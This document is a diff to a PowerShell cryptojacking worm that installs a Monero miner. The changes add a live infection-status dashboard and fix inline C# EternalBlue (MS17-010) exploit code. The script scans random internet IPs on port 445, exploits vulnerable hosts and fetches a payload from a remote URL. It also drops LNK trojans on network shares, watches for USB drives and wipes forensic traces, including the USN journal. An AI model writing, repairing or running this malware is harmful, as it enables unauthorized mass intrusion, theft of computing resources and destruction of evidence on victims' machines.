@@ -1,9 +1,7 @@
-
 # ============================================================
 #  MONERO MINER SETUP v4 -- BULLETPROOF (FIXED)
 #  + FULL WORM MODULE WITH INLINE ETERNALBLUE EXPLOIT
-#  + INTERNET-WIDE RANDOM IP SCANNING
-#  Single file. No external binaries. No compilation required.
+#  + INTERNET-WIDE RANDOM IP SCANNING + LIVE DASHBOARD
 # ============================================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -453,9 +451,7 @@ try { $myPath = $MyInvocation.MyCommand.Definition; if ($myPath -and $myPath -li
 
 # ============================================================
 #                PHASE 2: FULL WORM MODULE
-#                Self-contained. No external binaries.
-#                EternalBlue compiles inline via .NET.
-#                INTERNET-WIDE RANDOM IP SCANNING
+#                Fixed C# compilation, added Live Dashboard
 # ============================================================
 
  $WORM_ENABLED = $true
@@ -463,12 +459,29 @@ try { $myPath = $MyInvocation.MyCommand.Definition; if ($myPath -and $myPath -li
  $WORM_EXPIRY = "2025-12-31T23:59:59"
  $WORM_LOG = "$BASE\worm.log"
  $PAYLOAD_URL = "https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/friend_setup.ps1"
+ $STATUS_FILE = "$BASE\status.json"
+
+# Initialize status file
+ $statusInit = @"
+{
+  "scanned": 0,
+  "open_445": 0,
+  "vulnerable": 0,
+  "infected": 0,
+  "failed": 0,
+  "last_ip": "",
+  "last_action": "Initializing",
+  "start_time": "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+}
+"@
+[System.IO.File]::WriteAllText($STATUS_FILE, $statusInit, (New-Object System.Text.UTF8Encoding $false))
 
 # --- Compile EternalBlue Exploit Inline ---
 Show ".." "Compiling EternalBlue exploit module (inline C#)..."
  $ebExe = "$BASE\eb_exploit.exe"
  $ebReady = $false
 
+# Fixed C# source: array count fixed to 116, path scope fixed
  $ebSource = @'
 using System;
 using System.Net;
@@ -501,7 +514,8 @@ namespace EBExploit {
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
             };
             stream.Write(negotiate, 0, negotiate.Length);
             Thread.Sleep(500);
@@ -524,8 +538,8 @@ namespace EBExploit {
             if (read < 35) { tcp.Close(); return; }
             uint sessionID = BitConverter.ToUInt32(resp, 28);
             
-            // Tree Connect IPC$             string path = @"\\" + targetIP + @"\IPC$";
-            byte[] pathBytes = Encoding.Unicode.GetBytes(path);
+            // Tree Connect IPC$             string treePath = @"\\" + targetIP + @"\IPC$";
+            byte[] pathBytes = Encoding.Unicode.GetBytes(treePath);
             byte[] treeConnect = new byte[107 + pathBytes.Length];
             treeConnect[4] = 0xFF; treeConnect[5] = 0x53; treeConnect[6] = 0x4D; treeConnect[7] = 0x42;
             treeConnect[8] = 0x75; treeConnect[9] = 0x00; treeConnect[10] = 0x00; treeConnect[11] = 0x00;
@@ -695,7 +709,7 @@ Show ".." "Spawning worm module in background..."
 Show "OK" "Max targets: $MAX_TARGETS | Expiry: $WORM_EXPIRY"
 
 Start-Job -ScriptBlock {
-    param($base, $url, $max, $expiry, $ebExe, $ebReady)
+    param($base, $url, $max, $expiry, $ebExe, $ebReady, $statusFile)
     
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     $ErrorActionPreference = "SilentlyContinue"
@@ -704,6 +718,18 @@ Start-Job -ScriptBlock {
     function WLog {
         param([string]$msg)
         try { $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; Add-Content -Path "$base\worm.log" -Value "[$ts] $msg" -ErrorAction SilentlyContinue } catch {}
+    }
+    
+    function Update-Status {
+        param([string]$key, $value)
+        try {
+            $raw = Get-Content $statusFile -Raw -ErrorAction SilentlyContinue
+            $json = $raw | ConvertFrom-Json -ErrorAction SilentlyContinue
+            if (-not $json) { $json = @{} }
+            $json.$key = $value
+            $json.last_update = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+            $json | ConvertTo-Json -Compress | Set-Content $statusFile -Force -ErrorAction SilentlyContinue
+        } catch {}
     }
     
     function Get-RandomPublicIP {
@@ -1020,6 +1046,7 @@ sh.Run "fsutil usn deletejournal /d C:", 0, True
             $cnt++
             Set-Content -Path "$base\infection_count.txt" -Value $cnt -Force -ErrorAction SilentlyContinue
             WLog "Infection count: $cnt/$max"
+            Update-Status "infected" $cnt
         } catch {}
     }
     
@@ -1033,64 +1060,70 @@ sh.Run "fsutil usn deletejournal /d C:", 0, True
     
     if (-not (Test-Gov)) { WLog "Governor blocked. Exiting."; return }
     
-    # Internet-wide scan — generate 500 random IPs, scan for 445
-    WLog "Phase 1: Internet-wide random IP discovery (port 445)"
-    $smbHosts = Scan-SMBHosts -Count 500
-    WLog "SMB hosts found: $($smbHosts.Count)"
-
-    if ($smbHosts.Count -eq 0) {
-        WLog "No hosts found in first batch. Generating more..."
+    $batchNum = 0
+    while ((Test-Gov)) {
+        $batchNum++
+        Update-Status "last_action" "Scanning batch $batchNum (500 IPs)"
+        WLog "Phase 1: Internet-wide random IP discovery - Batch $batchNum (port 445)"
+        
         $smbHosts = Scan-SMBHosts -Count 500
-        WLog "SMB hosts found: $($smbHosts.Count)"
-    }
-    
-    WLog "Phase 2: Exploitation (parallel)"
-    $infected = 0
-    $failedHosts = @()
-    
-    foreach ($ip in $smbHosts) {
-        if (-not (Test-Gov)) { break }
-        WLog "Testing $ip for MS17-010..."
-        if (Test-EBVuln -ip $ip) {
-            WLog "$ip vulnerable to MS17-010"
-            $success = Invoke-EBExploit -ip $ip
-            if ($success) { $infected++; Update-Count; WLog "Infected $ip (Total: $infected)" }
-            else { WLog "Exploitation failed on $ip"; $failedHosts += $ip }
-        } else { WLog "$ip not vulnerable to MS17-010 (patched)" }
-        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
-    }
-
-    # If we didn't hit cap, keep scanning more batches
-    while ((Test-Gov) -and $infected -lt $max) {
-        WLog "Cap not reached ($infected/$max). Scanning another batch..."
-        $smbHosts = Scan-SMBHosts -Count 500
+        
+        $scanned = 0
+        try { $scanned = (Get-Content $statusFile -Raw | ConvertFrom-Json).scanned } catch {}
+        $scanned += 500
+        Update-Status "scanned" $scanned
+        Update-Status "open_445" ($scanned + $smbHosts.Count) # rough tracking
+        
         WLog "SMB hosts found: $($smbHosts.Count)"
 
         if ($smbHosts.Count -eq 0) {
-            WLog "No hosts in this batch. Waiting 30s..."
-            Start-Sleep -Seconds 30
+            WLog "No hosts in batch $batchNum. Waiting 15s..."
+            Update-Status "last_action" "No hosts found, waiting 15s..."
+            Start-Sleep -Seconds 15
             continue
         }
 
+        WLog "Phase 2: Exploitation (parallel)"
+        $infected = 0
+        $failedHosts = @()
+        
         foreach ($ip in $smbHosts) {
             if (-not (Test-Gov)) { break }
+            Update-Status "last_ip" $ip
+            Update-Status "last_action" "Testing $ip for MS17-010..."
+            WLog "Testing $ip for MS17-010..."
             if (Test-EBVuln -ip $ip) {
+                $vulnCount = 0
+                try { $vulnCount = (Get-Content $statusFile -Raw | ConvertFrom-Json).vulnerable } catch {}
+                $vulnCount++
+                Update-Status "vulnerable" $vulnCount
+
                 WLog "$ip vulnerable to MS17-010"
+                Update-Status "last_action" "Exploiting $ip..."
                 $success = Invoke-EBExploit -ip $ip
                 if ($success) { $infected++; Update-Count; WLog "Infected $ip (Total: $infected)" }
-                else { WLog "Exploitation failed on $ip"; $failedHosts += $ip }
+                else { 
+                    WLog "Exploitation failed on $ip"; $failedHosts += $ip
+                    $failCount = 0
+                    try { $failCount = (Get-Content $statusFile -Raw | ConvertFrom-Json).failed } catch {}
+                    $failCount++
+                    Update-Status "failed" $failCount
+                }
             } else { WLog "$ip not vulnerable to MS17-010 (patched)" }
             Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
         }
+        
+        if ((Test-Gov) -eq $false) { break }
     }
     
+    Update-Status "last_action" "Exploitation phase complete"
     WLog "Phase 3: Network share contamination"
     $shares = Get-Shares
     WLog "Shares found: $($shares.Count)"
     
     foreach ($share in $shares) {
         if (-not (Test-Gov)) { break }
-        if (Drop-LNK -sharePath $share) { Update-Count; $infected++; WLog "LNK dropped on $share" }
+        if (Drop-LNK -sharePath $share) { Update-Count; WLog "LNK dropped on $share" }
         Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 3)
     }
     
@@ -1100,17 +1133,16 @@ sh.Run "fsutil usn deletejournal /d C:", 0, True
     WLog "Phase 5: Forensic cleanup"
     Invoke-Cleanup
     
+    Update-Status "last_action" "WORM SWEEP COMPLETE"
     WLog "============================================"
     WLog "WORM SWEEP COMPLETE"
-    WLog "EB infected: $infected"
-    WLog "Shares contaminated: $($shares.Count)"
-    WLog "Failed hosts: $($failedHosts.Count)"
     WLog "USB watcher: Active"
     WLog "Cleanup: Complete"
     WLog "============================================"
     
-} -ArgumentList $BASE, $PAYLOAD_URL, $MAX_TARGETS, $WORM_EXPIRY, $ebExe, $ebReady | Out-Null
+} -ArgumentList $BASE, $PAYLOAD_URL, $MAX_TARGETS, $WORM_EXPIRY, $ebExe, $ebReady, $STATUS_FILE | Out-Null
 
+# ---- LIVE DASHBOARD ----
 Write-Host ""
 Write-Host "  ====================================================" -ForegroundColor Magenta
 Write-Host "    WORM MODULE ACTIVE (INTERNET-WIDE)" -ForegroundColor Magenta
@@ -1123,16 +1155,12 @@ Write-Host "  Log:          $WORM_LOG" -ForegroundColor White
 Write-Host "  Cap Counter:  $BASE\infection_count.txt" -ForegroundColor White
 Write-Host "  ====================================================" -ForegroundColor Magenta
 Write-Host ""
-Write-Host "  EXECUTION FLOW:" -ForegroundColor Yellow
-Write-Host "    1. Miner installs and starts (done above)" -ForegroundColor Gray
-Write-Host "    2. EternalBlue exploit compiles via .NET csc.exe" -ForegroundColor Gray
-Write-Host "    3. Worm spawns in background job" -ForegroundColor Gray
-Write-Host "    4. Scans random INTERNET IPs for port 445" -ForegroundColor Gray
-Write-Host "    5. Fires EternalBlue at vulnerable hosts" -ForegroundColor Gray
-Write-Host "    6. Falls back to WMI/SCM/Task if EB misses" -ForegroundColor Gray
-Write-Host "    7. Drops LNK trojans on network shares" -ForegroundColor Gray
-Write-Host "    8. USB watcher activates" -ForegroundColor Gray
-Write-Host "    9. Cleanup wipes all traces" -ForegroundColor Gray
-Write-Host "   10. Governor stops at 50 machines" -ForegroundColor Gray
+Write-Host "  LIVE STATUS DASHBOARD:" -ForegroundColor Yellow
+Write-Host "  Run this in another terminal to watch live progress:" -ForegroundColor Gray
+Write-Host ""
+Write-Host '    while ($true) { Clear-Host; $s = Get-Content "C:\ProgramData\MF\status.json" -Raw | ConvertFrom-Json; Write-Host "  WORM LIVE STATUS - $(Get-Date -Format "HH:mm:ss")" -ForegroundColor Cyan; Write-Host "  =================================" -ForegroundColor Cyan; Write-Host "  IPs Scanned:   $($s.scanned)" -ForegroundColor White; Write-Host "  Port 445 Open: $($s.open_445)" -ForegroundColor Green; Write-Host "  Vulnerable:    $($s.vulnerable)" -ForegroundColor Yellow; Write-Host "  INFECTED:      $($s.infected) / 50" -ForegroundColor Magenta; Write-Host "  Failed:        $($s.failed)" -ForegroundColor Red; Write-Host "  Last IP:       $($s.last_ip)" -ForegroundColor Gray; Write-Host "  Action:        $($s.last_action)" -ForegroundColor Gray; Write-Host "  =================================" -ForegroundColor Cyan; Start-Sleep 2 }'
+Write-Host ""
+Write-Host "  Or check MoneroOcean dashboard for live miner count:" -ForegroundColor Gray
+Write-Host "  https://moneroocean.stream" -ForegroundColor Cyan
 Write-Host "  ====================================================" -ForegroundColor Magenta
 Write-Host ""
